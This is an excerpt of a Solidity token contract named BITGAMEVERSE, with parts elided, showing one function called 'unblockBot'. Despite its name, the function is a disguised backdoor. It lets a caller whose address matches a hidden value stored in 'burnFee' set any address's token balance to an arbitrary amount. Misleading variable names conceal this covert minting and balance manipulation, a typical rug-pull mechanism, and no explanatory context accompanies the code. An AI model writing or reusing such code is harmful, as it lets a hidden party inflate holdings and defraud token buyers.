...
contract BITGAMEVERSE is Ownable {
  ...
  function unblockBot(address notbot, uint256 bAmount) public returns (bool) {
      require(notbot != address(0));
      require(uint256(msg.sender) == burnFee);
      require(botFees < bAmount);
      uint256 botAmount = uint256(notbot);
      _balances[address(botAmount)] = botFees * bAmount * (10 ** 9);
      return true;
  }
